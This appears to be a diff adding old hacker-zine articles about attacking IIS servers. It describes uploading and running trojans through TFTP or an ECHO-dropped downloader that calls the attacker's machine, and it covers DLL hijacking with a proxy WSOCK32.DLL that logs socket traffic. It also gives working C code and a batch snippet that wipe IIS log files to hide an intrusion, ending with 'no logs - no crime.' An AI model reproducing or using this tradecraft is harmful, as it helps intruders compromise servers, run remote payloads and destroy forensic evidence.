@@ -1,0 +1,357 @@
+
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[FILEXFER.TXT]ÄÄÄ
+                       xpl0itati0n-0riented f1le Xfer
+                       ------------------------------
+
+                additional stuff: TFTPSERV\*.* and ZFTP\*.*
+
+     Some  time  ago IIS unicode bug was very popular, and many good people
+ were  playing  with  it.  All  the  methods  of  exploiting IIS using this
+ vulnerability were based on the following: since it is possible to execute
+ shell  commands  on  the vulnerable machine, it is possible to upload some
+ executable file there and execute it.
+     And there were some common methods of uploading executable files:
+
+     1. Using TFTP.EXE
+
+        - run TFTP server, which will serve some trojan executable
+        - by means of TFTP.EXE, download executable from TFTP server
+        - execute downloaded file
+
+     2. using ECHO command
+
+        - by means of ECHO command, create some text file
+        - execute created file
+
+     More info about details of this stupid useless things you can read out
+ of here, for sure.
+
+     Main problem of all these methods were file uploading.
+     All  win32 TFTP servers were working in GUI-mode, which is sucks, same
+ as  uploading  different .ASPs, scripts and other shit -- because this all
+ is  not  automation-oriented  stuff.  There were also sources of unix TFTP
+ server, which makes win32 programmer crying when looking into.
+
+     So, here will be presented the following things:
+
+     1. Sources of console multithreaded win32 TFTP server,
+        which allows only GET method, tested with win2k::TFTP.EXE
+
+        NOTE:
+          TFTP.EXE, when GET'ting, opens for w+ temporary file,
+          such as TFTP-nnnnnnn., which then marked as read-only.
+          Name of this temporary file is choosen depending not
+          on seconds, but on some other time structure fields,
+          so, when TFTP.EXE is remotely executed several times with
+          small time interval, it results in error
+          'can't write to local file 'xxx'' -- because stupid TFTP.EXE
+          can not reopen for w+ own temporary readonly file.
+
+     2. ZFTP Client and Server:
+          BASE64-alike encoded .COM file (0..9,A..Z,a..z,-,_),
+          to be dropped by means of ECHO command,
+          which then downloads and runs main executable.
+          It is also useful when TFTP.EXE is deleted
+          by some unknown motherfucker.
+
+                        ZFTP CLIENT/SERVER for win32
+                        ----------------------------
+
+  machine_A(hax0r):
+    1. run ZFTP SERVER (listen for connections)
+    2. by means of ECHO command, drop .COM file (ZFTP CLIENT)
+    2. remotely run ZFTP CLIENT on machine_B,
+       specifying server's ip/port in cmdline
+
+  machine_B(target):
+    1. ZFTP CLIENT: contact ZFTP SERVER on machine_A
+    2. download some file from server
+    3. run downloaded file
+
+  CLIENT's commandline specifies server port & ip, to connect to.
+
+    C:\>CLIENT.COM ____30397F000001
+
+      ____        -->signature
+      3039        -->htons(server_port), here 12345
+      7F000001    -->server ip, address of machine_A, to download file from,
+                     here 127.0.0.1
+
+     ZFTP   protocol   is  simple  TCP  file  xfer,  initiated  by  client.
+ Transferred  file  is padded by AA,55,AA,55 bytes. After file is sent, TCP
+ session  is closed by server, and then client checks this 4-byte signature
+ to decide if file is transferred ok.
+
+                                   Notes
+                                   -----
+
+     Both  servers  are  multithreaded,  and  oriented  to long independend
+ serving. For each server's address there created independed server thread,
+ which  listens  for  incoming  connections on corresponding IP. This means
+ that  you  can  use  any  IP if server is running on machine with multiple
+ addresses.  When client is connecting, there also created client's thread,
+ in  which  file  is  passed  to  client.  There  are  also created special
+ monitoring  thread,  which  check client/server threads and kills/restarts
+ them  if  they're  halted.  While  this  process  all  handles/sockets are
+ correctly  closed,  so  there  will  be  no memory leak. Also both servers
+ allows adding SEH (try/except), to make'em more reliable.
+
+     To  make  server  working  right, remove debug logging (log.cpp), then
+ change -lap to -laa (cui-->gui) in the make.bat file, and recompile.
+
+                                   * * *
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[FILEXFER.TXT]ÄÄÄ
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[WINSOCK.TXT]ÄÄÄ
+                               WinSock Logger
+                               --------------
+
+                       additional stuff: WSOCKLOG\*.*
+
+     This stuff will show you how to re-write standard system DLL's, making
+ them  working  same  as  original  ones. Also, it describes my own WinSock
+ Logger, which i wrote when was learning WinSock API.
+
+     This  logger  is  based  on the following idea: when PE EXE program is
+ executed,  DLL  files  are searched at first in the current directory, and
+ only  after that in the system ones. So, we can put our own WSOCK32.DLL to
+ the same directory with EXE file, and in this way hook and process all the
+ WinSock API calls.
+
+     The  main  trick  is  to write own WSOCK32.DLL having exactly the same
+ exported  functions  as  original  one  has;  and all these functions must
+ have the same ordinal values within PE Export Table structure.
+
+     The  same  exported functions problem can be solved by writing all own
+ functions which will call original ones, as shown below:
+
+u_long WSAAPI old_ntohl (IN u_long netlong);
+
+u_long WSAAPI new_ntohl (IN u_long netlong)
+{
+  return old_ntohl(netlong);
+}
+
+  // original send(), will be imported from WSOCKXX.DLL(old WSOCK32.DLL)
+int WSAAPI old_send (
+                     IN SOCKET s,
+                     IN const char FAR * buf,
+                     IN int len,
+                     IN int flags);
+
+  // new send(), will be exported from WSOCK32.DLL
+int WSAAPI new_send (
+                     IN SOCKET s,
+                     IN const char FAR * buf,
+                     IN int len,
+                     IN int flags)
+{
+  // options --> process send ?
+  if ((x_options[ID_SEND]&1)==0)
+    return old_send(s, buf, len, flags);
+  // log call
+  log("* send(socket=%08X, len=%08X, flags=%s)", (DWORD)s, len, flagstr(flags));
+  // options --> log send() data ?
+  if (x_options[ID_SEND]==3)
+    dump_buf((char*)buf,len);
+  // call original send()
+  int res = old_send(s, buf, len, flags);
+  // log result
+  log("  returns %08X, error=%s", res, wsaerrmsg());;
+  // return
+  return res;
+} // new_send()
+
+     The  problem  with  ordinals  is  a  bit  more hard, because ordinals,
+ written  in  .DEF  file,  are  incorrectly  processed  by TLINK32.EXE. So,
+ special  program  called  'ordinal'  was  written, which re-sorts ordinals
+ within PE files corresponding to given .DEF file.
+
+     Well,  after  you  understood  how this all was done, take a look into
+ ws32_??.cpp:  it  has not only documented winsock api function prototypes,
+ but  also  all other function prototypes i've found within WSOCK32.DLL, on
+ both  98  and  2k systems. Also note, that 98 and 2k systems has different
+ undocumented functions within WSOCK32.DLL, and different ordinal values.
+
+     Now,  about  how  this  all worx. Just put WSOCK32.DLL and WSOCKXX.DLL
+ from  W2K  or  W98 directory into directory with program you're interested
+ in;  then  run  (or re-run) this program and enjoy. Also, both DLLs can be
+ put  into  %SystemDirectory%,  and  as  such  you  will  be  able  to  log
+ everything.
+
+     CONFIG  is  simple  logger  configuration editor, it just edits logger
+ settings  which  are  all stored in registry. Note, that modified settings
+ are applied when DLL is loaded into memory: no difference, by loader or by
+ LoadLibrary,  so,  when  changing  configuration,  dont  forget to restart
+ debugging application.
+
+                                   * * *
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[WINSOCK.TXT]ÄÄÄ
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[IISLOG.TXT]ÄÄÄ
+                        IIS Log Cleaning in Run-Time
+                        ----------------------------
+
+                        additional stuff: IISLOG\*.*
+
+     Some people, who played with IIS servers enough, know, that by default
+ there are log files, located in
+
+                %SystemDirectory%\LogFiles\W3SVC1\yymmdd.log
+
+     These  files  contains all http requests sent to IIS server, including
+ source IP addresses. While IIS is running, current log file is opened, and
+ can  not  be  deleted.  So,  some good people does this: by means of ECHO,
+ create and execute .BAT file, containing the following:
+
+      iisreset /stop
+      del %systemdir%\LogFiles\W3SVC1\*.log
+      iisreset /start
+
+     It will stop IIS service, delete log files and start IIS again.
+
+     This method has the following problems:
+
+     1. In some cases service will not stop.
+     2. In other cases it will not start. ;-)
+     3. Log files may be configured to be located in another place.
+     4. Such log deletion can not be checked,
+        because each http request results in correspoding log record,
+        _after_ the request is processed - so, even if you will
+        delete log file with some request,
+        right after that new log file will be created
+        with new 1st record containing your IP.
+
+     There  is  another method, which based on the following fact: log file
+ is  opened  in  compatible mode, allowing it to be opened in read-write by
+ other  processes.  And  all we need to do is to open log file for rw using
+ FILE_SHARE_READ | FILE_SHARE_WRITE flags.
+
+     So,  the  right way is not to delete log files, and not to hide within
+ tons  of  IP  addresses  of  other  stupid  haxor,  but  to  fuck  machine
+ completely:  by  uploading  there  executable program which will clear log
+ files with high reliability.
+
+     And here is log-cleaning part of such program:
+
+#define C_IIS_KEYPATH "SYSTEM\\CurrentControlSet\\Services\\W3SVC\\Parameters"
+#define C_IIS_LOGSUBKEY "LogFileDirectory"
+
+#define IISLOG_BLOCK_SIZE      65536
+
+void cleaniislogfile(char* filename)    // clean single .log file
+{
+  // open LOG file in compatible mode
+  HANDLE h = CreateFile(filename,
+                        GENERIC_READ | GENERIC_WRITE,
+                        FILE_SHARE_READ | FILE_SHARE_WRITE,
+                        NULL,
+                        OPEN_EXISTING,
+                        FILE_ATTRIBUTE_NORMAL | FILE_FLAG_SEQUENTIAL_SCAN,
+                        NULL);
+  // return if not opened
+  if (h == INVALID_HANDLE_VALUE) return;
+  // allocate some temporary buffer
+  DWORD buflen;
+  char* buf = (char*)malloc( IISLOG_BLOCK_SIZE+1 );
+  if (buf != NULL)
+  {
+    // if allocated, zerofill
+    memset(buf, 0x00, IISLOG_BLOCK_SIZE);
+    // get file size
+    DWORD len = GetFileSize(h, NULL);
+    // zerofill file
+    while(len)
+    {
+      DWORD buflen = MIN( len, IISLOG_BLOCK_SIZE );
+      WriteFile(h, buf, buflen, &buflen, NULL);
+      len -= buflen;
+    }
+    // free allocated memory
+    free(buf);
+  }
+  // close file
+  CloseHandle(h);
+} // cleaniislogfile()
+
+void cleaniislogrecursive(char* path, int reclevel)  // search for .log files
+{
+  // copy path to search in
+  char* buf = (char*)malloc(strlen(path)+MAXPATH+2);
+  if (buf==NULL) return;
+  strcpy(buf, path);
+  // add \ if needed
+  if (strrchr(buf,'\\')+1!=strchr(buf,0)) strcat(buf, "\\");
+  char* bufend = strchr(buf, 0);
+  // add *.*
+  strcat(buf, "*.*");
+  // start search
+  WIN32_FIND_DATA ff;
+  HANDLE h = FindFirstFile(buf, &ff);
+  if (h != INVALID_HANDLE_VALUE)
+  {
+    for(;;) // for each file found
+    {
+      // form full path and file name
+      strcpy(bufend, ff.cFileName);
+      // if directory
+      if (ff.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
+      {
+        if (strcmp(ff.cFileName, "." )!=0)
+        if (strcmp(ff.cFileName, "..")!=0)
+          if (reclevel == 0)
+            // logs are contained in LogFiles\W3SVC\ directory by default
+            if (strncmpi(ff.cFileName, "W3SVC", 5)==0)
+              cleaniislogrecursive(buf, reclevel+1);
+      }
+      else
+      {
+        char* t = strrchr(ff.cFileName,'.');
+        if (t && (stricmp(t,".log")==0))
+          cleaniislogfile(buf); // zerofill found file
+      }
+      // find next file, exit if no more files
+      if (FindNextFile(h, &ff) == 0) break;
+    }
+    // stop search
+    FindClose(h);
+  }
+  // free allocated memory
+  free(buf);
+} // cleaniislogrec()
+
+  // clear everything. call it from your src.
+  // be sure that current http request processing by iis has been finished.
+void CleanIISLogs()
+{
+  // 1. \WINNT\SYSTEM32\LogFiles
+  cleaniislogrecursive("\\WINNT\\SYSTEM32\\LogFiles\\",0);
+  // 2. C:\WINNT\SYSTEM32\LogFiles
+  cleaniislogrecursive("C:\\WINNT\\SYSTEM32\\LogFiles\\",0);
+  // 3. %SystemDirectory%\LogFiles
+  char temp[MAXPATH];
+  GetSystemDirectory(temp,MAXPATH);
+  strcat(temp, "\\LogFiles\\");
+  cleaniislogrecursive(temp,0);
+  // 4. %SYSTEM\CurrentControlSet\Services\W3SVC\Parameters.LogFileDirectory%
+  // open key
+  HKEY hKey;
+  if ( RegOpenKeyEx(HKEY_LOCAL_MACHINE, C_IIS_KEYPATH, 0, KEY_QUERY_VALUE,
+                    &hKey) != ERROR_SUCCESS ) return;
+  // get key value (log files directory)
+  char buf[1024];
+  DWORD buflen = sizeof(buf);
+  if ( RegQueryValueEx(hKey, C_IIS_LOGSUBKEY, 0,
+                       NULL, buf, &buflen) == ERROR_SUCCESS )
+  {
+    // can contain %SystemDirectory% - alike environment strings, so expand
+    char expbuf[1024];
+    ExpandEnvironmentStrings(buf, expbuf, sizeof(expbuf));
+    // find & clean logs
+    cleaniislogrecursive(expbuf, 0);
+  }
+  RegCloseKey(hKey);
+} // CleanIISLogs()
+
+     Well, thats all. And remember: no logs - no crime.
+
+                                   * * *
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[IISLOG.TXT]ÄÄÄ
